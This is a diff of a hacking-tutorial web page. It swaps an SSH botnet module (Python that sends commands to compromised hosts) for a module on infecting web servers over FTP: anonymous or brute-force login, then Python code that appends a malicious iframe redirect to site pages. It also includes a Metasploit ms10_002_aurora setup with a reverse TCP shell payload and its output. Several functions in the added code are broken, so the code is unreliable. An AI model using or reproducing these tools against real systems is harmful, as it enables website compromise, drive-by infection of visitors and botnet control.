@@ -33,7 +33,7 @@ integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65q
   <body>
     <!-- Reference item-->
     <!-- navbar-->
-    <header class="header">
+    <header class="header" >
       <nav class="navbar navbar-expand-lg fixed-top">
         <div class="container"><a href="#intro" class="navbar-brand scrollTo">Killer</a>
           <button type="button" data-toggle="collapse" data-target="#navbarcollapse" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right"><span class="fa fa-bars"></span></button>
@@ -51,133 +51,187 @@ integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65q
     </header>
     <!-- Intro Image-->
 	<section>
-      <div class="about container" style="padding-top:30px;font-family: 'Oswald', sans-serif;">
-  <h1>SSH Botnet</h1>
+      <div class="about container" style="padding-top:30px;font-family: 'Oswald', sans-serif;font-size:120%;">
+  <h1>Injecting malicious file using FTP Protocol</h1>
   <div class="line" style="height:2px;width:100%;background:red;margin:5px;"></div>
   <p style="font-family: 'Dosis', sans-serif;font-size:120%;">
-  A botnet is a number of Internet-connected devices, each of which is running one or more bots. 
-  Botnets can be used to perform distributed denial-of-service attack (DDoS attack), steal data,send spam, and allows 
-  the attacker to access the device and its connection. The owner can control the botnet using command and control (C&C) software. 
-  The word "botnet" is a combination of the words "robot" and "network". The term is usually used with a negative or malicious connotation.
+  The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client
+  and server on a computer network.
 
-Telnet botnets use a simple C&C botnet Protocol in which bots connect to the main command server to host the botnet. Bots are added to the botnet by using a scanning script, the scanning script is run on an external server and scans IP ranges for telnet and SSH server default logins. Once a login is found it is added to an infection list and infected with a malicious infection line via SSH on from the scanner server. When the SSH command is run it infects the server and commands the server to ping to the control server and becomes its slave from the malicious code infecting it.
- Once servers are infected to the server the bot controller can launch DDoS attacks of high volume using the C&C panel on the host server.</p>
+FTP is built on a client-server model architecture and uses separate control and data connections between the client and the server.
+ FTP users may authenticate themselves with a clear-text sign-in protocol, normally in the form of a username and password, 
+ but can connect anonymously if the server is configured to allow it. For secure transmission that protects the username and password, 
+and encrypts the content, FTP is often secured with SSL/TLS (FTPS) or replaced with SSH File Transfer Protocol (SFTP).</p>
  
-<p><strong>In this module we are going to create a basic SSH bot used to connect to ssh server and execute commands.<br></p>
+<p><strong>In this module we are going to inject virus file into web server using ftp protocol.<br></p>
 Having an idea on below topics would help you for better understanding.<br></strong>
-<p>*Python  &nbsp;&nbsp;   *Classes and Objects &nbsp; &nbsp;*pxssh module </p>
+<p>*Python  &nbsp;&nbsp;   *optparse module &nbsp; &nbsp;*ftplib module </p>
 
 <h3>Execution:</h3>
   <div class="line" style="height:2px;width:100%;background:red;margin:5px;"></div>
-<p>We will use the Python pexpect library with pxssh module to connect to the SSH Server.After a sucessful connection we will send the commands 
-to be executed.<br><br>
-Learn about Pxssh module: <a href="https://pexpect.readthedocs.io/en/stable/api/pxssh.html">Official Documentation</a>
+<p>We will use the Python ftplib pxssh module to connect to the ftp Server.After a sucessful connection we will inject the malicious file.<br><br>
+Learn about FTPlib module: <a href="https://docs.python.org/2/library/ftplib.html">Official Documentation</a><br>
+Learn about optparse module: <a href="https://docs.python.org/2/library/optparse.html">Official Documentation</a>
 
-We will implement many other modules:<br>
+<!--We will implement many other modules:<br>
 * Os module<br>
 * sys module<br>
-* colorama module<br>
+* colorama module--><br>
 </p>
+
+<p>The malicious file can be created by using metasploit framework.</p>
+<p>We gonna try to login to ftp using anonymous method,If not succeded we'll try bruteforce to login.
+With credentials on the FTP server, we must now test if the server also provides
+web access. In order to test this, we will first list the contents of the FTP server’s
+directory and search for default web pages. The function returnDefault() takes
+an FTP connection as the input and returns an array of default pages it finds.
+It does this by issuing the command NLST, which lists the directory contents.
+The function checks each file returned by NLST against default web page file
+names. It also appends any discovered default pages to an array called retList.
+After completing the iteration of these files, the function returns this array.<br><br>
+
+Now that we have found web page files, we must infect them with a malicious
+redirect. We will use the Metasploit framework in order to quickly create a
+malicious server and page hosted at http://10.10.10.112:8080/exploit. Notice
+we choose the exploit ms10_002_aurora, the very same exploit used during
+Operation Aurora against Google. The page at 10.10.10.112:8080/exploit will
+exploit redirected victims, which will provide a call back to our command and
+control server.<br><br>
+attacker# msfcli exploit/windows/browser/ms10_002_aurora 
+<br>LHOST=10.10.10.112 SRVHOST=10.10.10.112 URIPATH=/exploit 
+<br>PAYLOAD=windows/shell/reverse_tcp LHOST=10.10.10.112 LPORT=443 
+[*] Please wait while we load the module tree...<br>
+<...SNIPPED...><br>
+LHOST => 10.10.10.112<br>
+SRVHOST => 10.10.10.112<br>
+URIPATH => /exploit<br>
+PAYLOAD => windows/shell/reverse_tcp<br>
+LHOST => 10.10.10.112<br>
+LPORT => 443<br>
+[*] Exploit running as background job.<br>
+[*] Started reverse handler on 10.10.10.112:443<br>
+[*] Using URL:http://10.10.10.112:8080/exploit<br>
+[*] Server started.<br>
+msf exploit(ms10_002_aurora) ><br><br>
+Any vulnerable client that connects to our server at http://10.10.10.112:8080/
+exploit will now fall prey to our exploit. If it succeeds, it will create a reverse
+TCP shell and grant us access to the Windows command prompt on the infected client. From the command shell, we can now execute commands as
+the administrator of the infected victim.<br>
+The function injectPage() takes an
+FTP connection, a page name, and a redirect iframe string as the input. It then
+downloads a temporary copy of that page. Next, it appends the iframe redirect
+to our malicious server to that temporary file. Finally, the function uploads the
+infected page back to the benign server.</p>
 
 <h3 style="padding:10px;">Code:<h3>
   <div class="line" style="height:2px;width:100%;background:red;margin:5px;"></div>
 <p style="font-size:80%;padding:10px;font-family:'Dosis',sans-serif;"> 
-import pxssh<br>
-import sysh<br>
-import osh<br>
-from colorama import Fore, Back, Styleh<br>
-from pexpect import pxsshh<br><br>
+import ftplib<br>
+import optparse<br><br>
 
-os.system('clear')<br><br>
+def anonLogin(hostname):<br>
+	try:<br>
+		ftp = ftplib.FTP(hostname)<br>
+		ftp.login('anonymous', 'me@your.com')<br>
+		print '\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.'<br>
+		ftp.quit()<br>
+		return True<br>
+	except Exception, e:<br>
+		print '\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.'<br>
+		return False<br><br>
+			
+def bruteLogin(hostname,passwdFile):<br><br>
+	
+	pF=open(passwdFile,'r')<br><br>
 
-print ""h<br>
-print ('-'*30+"SSH Bot Maker"+'-'*30)<br>
-print  (Fore.GREEN+"")<br>
-print "1.List Bot"<br>
-print "2.Run Command"<br>
-print "3.Bash"h<br>
-print "4.Exit"h<br><br>
-
-option=raw_input("Enter any option:")<br>
-
-
-#Creating clinet instanceh<br>
-class Client:<br>
-
-	def __init__(self,host,user,password):<br><br>
-
-		self.host=host<br>
-		self.user=user<br>
-		self.password=password<br>
-		self.session=self.connect()<br><br>
-
-#connecting to the ssh server<br>
-	def connect(self):<br>
-		try:<br>
-			s=pxssh.pxssh()<br>
-	      		s.login(self.host,self.user,self.password)<br>
-			return s<br>
-		except Exception,e:<br>
-			print e<br>
-			print (Fore.RED+"[-]Error connecting")<br><br>
-
-#Sending a command to execute		<br>	
-	def send_command(self,cmd):<br>
-		self.session.sendline(cmd)<br>
-		self.session.prompt()<br>
-		return self.session.before<br><br>
-
-#Running through the loop so that it can travese the complete clients	<br>	
-def botnetCommand(command):<br>
-	for client in botnet:<br>
-		output=client.send_command(command)<br>
-		print "[*]Output from" +client.host<br>
-		print "[+]<<<"+output<br><br>
-
-#Adding new clients to botnet<br>
-def addclient(host,user,password):<br>
-	client=Client(host,user,password)<br>
-	botnet.append(client)<br><br>
-
-#Input command to run<br>
-def askforcommand():<br>
-	run=raw_input(Fore.GREEN+"Enter a command to run:")<br>
-	botnetCommand(run)<br><br>
-
-#Input command to run in bash<br><br>
-def bash():<br>
-	bash=raw_input(">>>:")<br>
-	botnetCommand('echo %s | /bin/bash' %bash)<br>
-
-botnet=[]<br>
-#add your bot computers<br>
-addclient('192.168.56.101','msfadmin','hacked')<br>
-
-#when required a password for a command use the below syntax<br>
-#echo <password> |sudo -S <command><br>
-#botnetCommand('echo hacked | sudo -S reboot')<br>
+	for line in pF.readlines():<br>
+		username=pF.split(':')[0]<br>
+		password=pF.split(':')[1].strip('\n')<br>
+		print "[+] Trying "+ username + password<br>
+	try:<br>
+		ftp=ftplib.FTP(hostname)<br>
+		ftplib.login(username,password)<br>
+		print "\n[+]" + str(hostname) + "Anonymous Logon Succeeded: " + username + password<br>
+		ftplib.quit()<br>
+		return (username,password)<br><br>
 
 
-if option =='1':<br>
-	n=len(botnet)<br>
-	for i in range(0,n):<br>
-		print str(botnet[i])<br>
-		i=i+1<br>
+	except Exception,e:<br>
+		pass<br>
+	print "[-] Could not bruteforce FTP Credentials"<br>
+	return (none,none)<br><br>
 
-elif option == '2':<br>
-	while True:	<br>
-		askforcommand()<br>
+def returnDefault(ftp):<br><br>
+	
+	try:<br>
+		dirList=ftp.nlst()<br>
+	except:<br>
+		dirList=[]<br>
+		print "[-] Could not list Directory contents"<br>
+		print "[-] Skipping to next Target"<br>
+		return<br>
+	retList=[]<br><br>
+	
+	for filename in dirList:<br>
+		fn=filename.lower()<br><br>
+		
+		if '.php' in fn or '.html' in fn or '.asp' in fn:<br>
+			print "[+]Found Default Page: "+filename<br>
+			retList.append(filename)<br><br>
 
-elif option == '3':<br>
-	while True:<br>
-		bash()<br>
+def injectPage(ftp,page,redirect):<br>
+	f=open(page + '.tmp','w')<br>
+	ftp.retrlines('RETR'+ page,f.write)<br>
+	print "[+]Downloaded Page:" + page<br>
+	f.write(redirect)<br>
+	f.close()<br>
+	print "[+]Injected Malicious Frame on:" +page<br>
+	ftp.storelines('STOR'+ page,open(page+ '.tmp'))<br>
+	print "[+]Uploaded Injected Page:" +page<br><br>
+	
+def attack(username,password,tgthost,tgtredirect):<br>
+	ftp=ftplib.FTP(tgthost)<br>
+	ftp.login(username,password)<br>
+	defPages=returnDefault(ftp)<br>
+	for page in defPages:<br>
+		injectPage(ftp,page,redirect)<br><br>
 
-else :<br>
-	sys.exit()<br>
+def main():<br>
+	parser=optparse.OptionParser('usage%prog -H<targer Host[s] -r<redirect page> -f<user pass file>')<br>
+	parser.add_option('-H', dest='tgtHosts', type="string", help="Specify target host")<br>
+	parser.add_option('-r', dest='redirect', type='string', help="Specify a redirect page")<br>
+	parser.add_option('-f', dest='passwdFile', type='string', help="Specify password file")<br>
+	(options,args)=parser.parse_args()<br><br>
+
+	tgtHosts=str(options.tgtHosts).split(' , ')<br>
+	redirect=options.redirect<br>
+	passwdFile=options.passwdFile<br><br>
+
+	if tgtHosts == None or redirect == None or passwdFile == None:<br>
+		print parser.usage<br>
+		exit(0)<br>
+
+	for tgthost in tgtHosts:<br>
+		username=None<br>
+		password=None<br>
+		if anonLogin(tgthost)==True:<br>
+			username="anonymous"<br>
+			password="me@your.com"<br>
+			print "[+]Using Anonymous Login to attack"<br>
+			attack(username,password,tgthost,redirect)<br>
+		
+		elif passwdFile!=None:<br><br>
+			(username,password)=bruteLogin(tgthost,passwdFile)<br><br>
+	
+		if password!= None:<br>
+			print "[+]Using Credintials:" + username  +'/'+ password +'to attack.'<br>
+			attack(username,password,tgthost,redirect)<br><br>
+
+main()			
 
 
 </p>
-<h2> <strong>Finally an sshbot is created.</strong> </h2>
+<h2> <strong>We Sucessfully injected malicious file to a web server</strong> </h2>
 
 <p><!-- AddToAny BEGIN -->
 <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
